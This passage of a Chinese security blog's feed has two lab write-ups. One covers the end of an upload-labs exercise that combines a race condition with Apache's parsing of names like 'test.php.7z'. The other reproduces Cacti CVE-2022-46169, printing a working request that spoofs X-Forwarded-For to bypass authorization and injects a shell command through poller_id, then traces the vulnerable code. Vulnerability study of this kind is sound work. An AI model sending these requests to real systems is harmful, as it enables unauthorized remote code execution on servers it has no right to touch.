&#x27;上传失败，服务器已经存在相同名称文件。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -6:</span><br><span class="line">            $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;;</span><br><span class="line">            break;      </span><br><span class="line">        default:</span><br><span class="line">            $msg = &#x27;未知错误！&#x27;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//myupload.php</span><br><span class="line">class MyUpload&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  var $cls_arr_ext_accepted = array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  /** upload()</span><br><span class="line">   **</span><br><span class="line">   ** Method to upload the file.</span><br><span class="line">   ** This is the only method to call outside the class.</span><br><span class="line">   ** @para String name of directory we upload to</span><br><span class="line">   ** @returns void</span><br><span class="line">  **/</span><br><span class="line">  function upload( $dir )&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = $this-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;setDir( $dir );</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkExtension();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkSize();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if flag to check if the file exists is set to 1</span><br><span class="line">    </span><br><span class="line">    if( $this-&gt;cls_file_exists == 1 )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = $this-&gt;checkFileExists();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if we are here, we are ready to move the file to destination</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;move();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // check if we need to rename the file</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_rename_file == 1 )&#123;</span><br><span class="line">      $ret = $this-&gt;renameFile();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if we are here, everything worked as planned :)</span><br><span class="line"></span><br><span class="line">    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在index.php中，首先new了一个MyUpload类，传入了上传的文件名，临时名，文件大小，随机time名（这个随机time和文件最终名字有关）</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728222746421.png" alt="image-20250728222746421"></p><p>然后传入UPLOAD_PATH给upload函数（也就是吧..&#x2F;upload传入），那么我们得看看类里面的代码才知道具体发生了什么。。</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728222706668.png" alt="image-20250728222706668"></p><p>对类初始化的时候调用Myupload函数，传入对应参数赋值</p><p>在upload函数中，是先进行文件路径、后缀、大小判断，然后文件移动、重命名。这里就出现很经典的逻辑问题了，先移动再重命令，就可以利用条件竞争对其进行访问。</p><p>可是问题出现了，其对文件上传后缀进行了检验，只能白名单上传</p><p>这里就要配合到apache的解析漏洞，在apache版本符合条件下，对mime.types中没有涉及的文件后缀不会解析，查看httpd.conf文件下的mime.types，没有发现7z后缀，说明不会解析7z文件</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728223000837.png" alt="image-20250728223000837"></p><p>比如<code>test.php.7z</code>这个文件，apache的解析是从后往前，当7z不能解析时，其向前解析一直到可以解析的后缀为止，所以将<code>test.php.7z</code>当作<code>test.php</code>执行。但是文件后缀上传后还是<code>test.php.7z</code>全称吗？看看代码，经过rename之后，文件名被修改为upload+time()函数的值+最后一个小数点后的后缀名，即变成了<code>upload+time.7z</code>这样，没有php了我们如何利用？</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728223105384.png" alt="image-20250728223105384"></p><p>这里就需要配合刚才说的条件竞争漏洞了，在rename之前是move操作，move后的极短时间内是没有rename的，我们通过频发发包访问达到目的。这里需要提一下，这关的文件上传目录不是在upload目录下，应该是作者不小心忽略的原因，所以会导致文件名中有个upload，但是不影响做题，如果想修改为upload目录下，则需要在rename函数中添加<code>/</code>即可</p><p>我们原题吧</p><p>开始抓包</p><p>一个为上传包，一个为访问包</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;练练文件上传&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="文件上传" scheme="https://heisha123.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>cacti CVE-2022-46169</title>
    <link href="https://heisha123.github.io/2025/07/25/cacti-CVE-2022-46169/"/>
    <id>https://heisha123.github.io/2025/07/25/cacti-CVE-2022-46169/</id>
    <published>2025-07-25T05:45:16.000Z</published>
    <updated>2025-07-25T15:33:39.974Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2022-46169 的rce 漏洞复现</p><span id="more"></span><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>我们在docker环境内配置</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725134750077.png" alt="image-20250725134750077"></p><p>然后我们在vs code连接docker容器</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725135718151.png" alt="image-20250725135718151"></p><p>现在需要配置xdebug，等会方便我们追代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pecl install xdebug-3.1.6</span><br><span class="line">运行安装 xdebug</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line">启用 xdebug 扩展</span><br><span class="line"></span><br><span class="line">在/usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini，添加如下内容：</span><br><span class="line"></span><br><span class="line">zend_extension=xdebug</span><br><span class="line">xdebug.mode=debug</span><br><span class="line">xdebug.start_with_request=yes</span><br></pre></td></tr></table></figure><p>这个添加需要我们在vs code中完成</p><p>然后我们需要重启一下容器</p><p><code>docker restart edf5255aa17d</code></p><p>然后重新连接即可</p><p>完成后我们就可以愉快的调试了</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725142041390.png" alt="image-20250725142041390"></p><p>没问题断下来了</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725141447174.png" alt="image-20250725141447174"></p><p>我们还需要创建一个采集器</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725141537182.png" alt="image-20250725141537182"></p><p>然后我们就可以退出登录了</p><p>避免session的影响</p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>我么的漏洞利用点在<code>/remote_agent.php</code></p><p>因为我们有payload ，直接下断。传入看一下整个流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`touch+/tmp/success`</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725185549794.png" alt="image-20250725185549794"></p><p>断下来了</p><p>往下追</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725185633322.png" alt="image-20250725185633322"></p><p>这里发现有一个鉴权函数，我们进去看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">function remote_client_authorized() &#123;</span><br><span class="line">global $poller_db_cnn_id;</span><br><span class="line"></span><br><span class="line">/* don&#x27;t allow to run from the command line */</span><br><span class="line">$client_addr = get_client_addr();</span><br><span class="line">if ($client_addr === false) &#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!filter_var($client_addr, FILTER_VALIDATE_IP)) &#123;</span><br><span class="line">cacti_log(&#x27;ERROR: Invalid remote agent client IP Address.  Exiting&#x27;);</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$client_name = gethostbyaddr($client_addr);</span><br><span class="line"></span><br><span class="line">if ($client_name == $client_addr) &#123;</span><br><span class="line">cacti_log(&#x27;NOTE: Unable to resolve hostname from address &#x27; . $client_addr, false, &#x27;WEBUI&#x27;, POLLER_VERBOSITY_MEDIUM);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$client_name = remote_agent_strip_domain($client_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pollers = db_fetch_assoc(&#x27;SELECT * FROM poller&#x27;, true, $poller_db_cnn_id);</span><br><span class="line"></span><br><span class="line">if (cacti_sizeof($pollers)) &#123;</span><br><span class="line">foreach($pollers as $poller) &#123;</span><br><span class="line">if (remote_agent_strip_domain($poller[&#x27;hostname&#x27;]) == $client_name) &#123;</span><br><span class="line">return true;</span><br><span class="line">&#125; elseif ($poller[&#x27;hostname&#x27;] == $client_addr) &#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cacti_log(&quot;Unauthorized remote agent access attempt from $client_name ($client_addr)&quot;);</span><br><span class="line"></span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们发现，<code>$client_addr = get_client_addr();</code> 直接通过这个函数来获取的ip地址，我们继续进去看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">function get_client_addr($client_addr = false) &#123;</span><br><span class="line">$http_addr_headers = array(</span><br><span class="line">&#x27;X-Forwarded-For&#x27;,</span><br><span class="line">&#x27;X-Client-IP&#x27;,</span><br><span class="line">&#x27;X-Real-IP&#x27;,</span><br><span class="line">&#x27;X-ProxyUser-Ip&#x27;,</span><br><span class="line">&#x27;CF-Connecting-IP&#x27;,</span><br><span class="line">&#x27;True-Client-IP&#x27;,</span><br><span class="line">&#x27;HTTP_X_FORWARDED&#x27;,</span><br><span class="line">&#x27;HTTP_X_FORWARDED_FOR&#x27;,</span><br><span class="line">&#x27;HTTP_X_CLUSTER_CLIENT_IP&#x27;,</span><br><span class="line">&#x27;HTTP_FORWARDED_FOR&#x27;,</span><br><span class="line">&#x27;HTTP_FORWARDED&#x27;,</span><br><span class="line">&#x27;HTTP_CLIENT_IP&#x27;,</span><br><span class="line">&#x27;REMOTE_ADDR&#x27;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$client_addr = false;</span><br><span class="line">foreach ($http_addr_headers as $header) &#123;</span><br><span class="line">if (!empty($_SERVER[$header])) &#123;</span><br><span class="line">$header_ips = explode(&#x27;,&#x27;, $_SERVER[$header]);</span><br><span class="line">foreach ($header_ips as $header_ip) &#123;</span><br><span class="line">if (!empty($header_ip)) &#123;</span><br><span class="line">if (!filter_var($header_ip, FILTER_VALIDATE_IP)) &#123;</span><br><span class="line">cacti_log(&#x27;ERROR: Invalid remote client IP Address found in header (&#x27; . $header . &#x27;).&#x27;, false, &#x27;AUTH&#x27;, POLLER_VERBOSITY_DEBUG);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$client_addr = $header_ip;</span><br><span class="line">cacti_log(&#x27;DEBUG: Using remote client IP Address found in header (&#x27; . $header . &#x27;): &#x27; . $client_addr . &#x27; (&#x27; . $_SERVER[$header] . &#x27;)&#x27;, false, &#x27;AUTH&#x27;, POLLER_VERBOSITY_DEBUG);</span><br><span class="line">break 2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return $client_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725185824538.png" alt="image-20250725185824538"></p><p>这里看起来就是 依次取了这些请求头，然后将他放进下面取依次循环</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725185921203.png" alt="image-20250725185921203"></p><p>这里用循环来判断ip是否合法</p><p>但是他这里直接break 2，跳出两层循环，</p><p>所以他一旦找到了一个合法的ip。他就会跳出循环直接将当前的ip赋值给<code>client_addr</code></p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725191132752.png" alt="image-20250725191132752"></p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725191513139.png" alt="image-20250725191513139"></p><p>当我们不赋值的时候，他读取的REMOTE_ADDR 在我们设置的HTTP_X_FORWARDED_FOR的后面所以</p><p>他获取到了ip后就直接跳出了，127.0.0.1 ，合法 ，绕过了这个鉴权函数</p><p>重新下断到</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725191653328.png" alt="image-20250725191653328"></p><p>进入分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function set_default_action($default = &#x27;&#x27;) &#123;</span><br><span class="line">if (!isset_request_var(&#x27;action&#x27;)) &#123;</span><br><span class="line">set_request_var(&#x27;action&#x27;, $default);</span><br><span class="line">&#125; elseif (is_array(get_nfilter_request_var(&#x27;action&#x27;))) &#123;</span><br><span class="line">if (read_config_option(&#x27;log_validation&#x27;) == &#x27;on&#x27;) &#123;</span><br><span class="line">cacti_log(&#x27;WARNING: Request variable \&#x27;action\&#x27; was passed as array in &#x27; . $_SERVER[&#x27;SCRIPT_NAME&#x27;] . &#x27;.&#x27;, false, &#x27;WEBUI&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_request_var(&#x27;action&#x27;, $_REQUEST[&#x27;action&#x27;][0]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">set_request_var(&#x27;action&#x27;, $_REQUEST[&#x27;action&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是对action做了处理</p><p>如果传入的action不正常，那么就会做如下处理</p><p>不允许传入数组，且必须要有参数</p><p>如果传入数组，那么就会提交日志，记录这是异常行为</p><p>所以这里我们需要传入正常的字符串</p><p>因为我们利用点 在后面那个pro 函数执行的地方，所以我们要进入</p><p><code>case &#39;polldata&#39;:</code> 这个分支</p><p>也就是为什么，我们的action要传入<code>polldata</code> 这个值</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725192557671.png" alt="image-20250725192557671"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">function poll_for_data() &#123;</span><br><span class="line">global $config;</span><br><span class="line"></span><br><span class="line">$local_data_ids = get_nfilter_request_var(&#x27;local_data_ids&#x27;);</span><br><span class="line">$host_id        = get_filter_request_var(&#x27;host_id&#x27;);</span><br><span class="line">$poller_id      = get_nfilter_request_var(&#x27;poller_id&#x27;);</span><br><span class="line">$return         = array();</span><br><span class="line"></span><br><span class="line">$i = 0;</span><br><span class="line"></span><br><span class="line">if (cacti_sizeof($local_data_ids)) &#123;</span><br><span class="line">foreach($local_data_ids as $local_data_id) &#123;</span><br><span class="line">input_validate_input_number($local_data_id);</span><br><span class="line"></span><br><span class="line">$items = db_fetch_assoc_prepared(&#x27;SELECT *</span><br><span class="line">FROM poller_item</span><br><span class="line">WHERE host_id = ?</span><br><span class="line">AND local_data_id = ?&#x27;,</span><br><span class="line">array($host_id, $local_data_id));</span><br><span class="line"></span><br><span class="line">$script_server_calls = db_fetch_cell_prepared(&#x27;SELECT COUNT(*)</span><br><span class="line">FROM poller_item</span><br><span class="line">WHERE host_id = ?</span><br><span class="line">AND local_data_id = ?</span><br><span class="line">AND action = 2&#x27;,</span><br><span class="line">array($host_id, $local_data_id));</span><br><span class="line"></span><br><span class="line">if (cacti_sizeof($items)) &#123;</span><br><span class="line">foreach($items as $item) &#123;</span><br><span class="line">switch ($item[&#x27;action&#x27;]) &#123;</span><br><span class="line">case POLLER_ACTION_SNMP: /* snmp */</span><br><span class="line">if (($item[&#x27;snmp_version&#x27;] == 0) || (($item[&#x27;snmp_community&#x27;] == &#x27;&#x27;) &amp;&amp; ($item[&#x27;snmp_version&#x27;] != 3))) &#123;</span><br><span class="line">$output = &#x27;U&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$host = db_fetch_row_prepared(&#x27;SELECT ping_retries, max_oids FROM host WHERE hostname = ?&#x27;, array($item[&#x27;hostname&#x27;]));</span><br><span class="line">$session = cacti_snmp_session($item[&#x27;hostname&#x27;], $item[&#x27;snmp_community&#x27;], $item[&#x27;snmp_version&#x27;],</span><br><span class="line">$item[&#x27;snmp_username&#x27;], $item[&#x27;snmp_password&#x27;], $item[&#x27;snmp_auth_protocol&#x27;], $item[&#x27;snmp_priv_passphrase&#x27;],</span><br><span class="line">$item[&#x27;snmp_priv_protocol&#x27;], $item[&#x27;snmp_context&#x27;], $item[&#x27;snmp_engine_id&#x27;], $item[&#x27;snmp_port&#x27;],</span><br><span class="line">$item[&#x27;snmp_timeout&#x27;], $host[&#x27;ping_retries&#x27;], $host[&#x27;max_oids&#x27;]);</span><br><span class="line"></span><br><span class="line">if ($session === false) &#123;</span><br><span class="line">$output = &#x27;U&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$output = cacti_snmp_session_get($session, $item[&#x27;arg1&#x27;]);</span><br><span class="line">$session-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (prepare_validate_result($output) === false) &#123;</span><br><span class="line">if (strlen($output) &gt; 20) &#123;</span><br><span class="line">$strout = 20;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$strout = strlen($output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$output = &#x27;U&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$return[$i][&#x27;value&#x27;]         = $output;</span><br><span class="line">$return[$i][&#x27;rrd_name&#x27;]      = $item[&#x27;rrd_name&#x27;];</span><br><span class="line">$return[$i][&#x27;local_data_id&#x27;] = $local_data_id;</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line">case POLLER_ACTION_SCRIPT: /* script (popen) */</span><br><span class="line">$output = trim(exec_poll($item[&#x27;arg1&#x27;]));</span><br><span class="line"></span><br><span class="line">if (prepare_validate_result($output) === false) &#123;</span><br><span class="line">if (strlen($output) &gt; 20) &#123;</span><br><span class="line">$strout = 20;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$strout = strlen($output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$output = &#x27;U&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$return[$i][&#x27;value&#x27;]         = $output;</span><br><span class="line">$return[$i][&#x27;rrd_name&#x27;]      = $item[&#x27;rrd_name&#x27;];</span><br><span class="line">$return[$i][&#x27;local_data_id&#x27;] = $local_data_id;</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line">case POLLER_ACTION_SCRIPT_PHP: /* script (php script server) */</span><br><span class="line">$cactides = array(</span><br><span class="line">0 =&gt; array(&#x27;pipe&#x27;, &#x27;r&#x27;), // stdin is a pipe that the child will read from</span><br><span class="line">1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), // stdout is a pipe that the child will write to</span><br><span class="line">2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)  // stderr is a pipe to write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">if (function_exists(&#x27;proc_open&#x27;)) &#123;</span><br><span class="line">$cactiphp = proc_open(read_config_option(&#x27;path_php_binary&#x27;) . &#x27; -q &#x27; . $config[&#x27;base_path&#x27;] . &#x27;/script_server.php realtime &#x27; . $poller_id, $cactides, $pipes);</span><br><span class="line">$output = fgets($pipes[1], 1024);</span><br><span class="line">$using_proc_function = true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$using_proc_function = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($using_proc_function == true) &#123;</span><br><span class="line">$output = trim(str_replace(&quot;\n&quot;, &#x27;&#x27;, exec_poll_php($item[&#x27;arg1&#x27;], $using_proc_function, $pipes, $cactiphp)));</span><br><span class="line"></span><br><span class="line">if (prepare_validate_result($output) === false) &#123;</span><br><span class="line">if (strlen($output) &gt; 20) &#123;</span><br><span class="line">$strout = 20;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$strout = strlen($output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$output = &#x27;U&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$output = &#x27;U&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$return[$i][&#x27;value&#x27;]         = $output;</span><br><span class="line">$return[$i][&#x27;rrd_name&#x27;]      = $item[&#x27;rrd_name&#x27;];</span><br><span class="line">$return[$i][&#x27;local_data_id&#x27;] = $local_data_id;</span><br><span class="line"></span><br><span class="line">if (($using_proc_function == true) &amp;&amp; ($script_server_calls &gt; 0)) &#123;</span><br><span class="line">/* close php server process */</span><br><span class="line">fwrite($pipes[0], &quot;quit\r\n&quot;);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line"></span><br><span class="line">$return_value = proc_close($cactiphp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print json_encode($return);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们真正的利用点就在这个函数里面</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725192635117.png" alt="image-20250725192635117"></p><p>这里 我们需要get传参 <code>local_data_ids</code> ，<code>host_id</code>，<code>poller_id</code>，</p><p>我们也可以发现，这里只有<code>local_data_ids</code> 后面加了s，大概率就是一个数组了，因为是复数嘛</p><p>，<code>get_nfilter_request_var</code> 他这里获取好像也过滤了我们的 get传参，进入分析</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725192854424.png" alt="image-20250725192854424"></p><p>很简单的一个函数</p><p>看起来也并没有什么过滤</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725193938615.png" alt="image-20250725193938615"></p><p>这里也成功的取到我们传入的参数</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725194343369.png" alt="image-20250725194343369"></p><p>我们真正的执行语句就在这一句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cactiphp = proc_open(read_config_option(&#x27;path_php_binary&#x27;) . &#x27; -q &#x27; . $config[&#x27;base_path&#x27;] . &#x27;/script_server.php realtime &#x27; . $poller_id, $cactides, $pipes);</span><br></pre></td></tr></table></figure><p>他先读取配置里 PHP 解释器的路径，确保用正确的 PHP 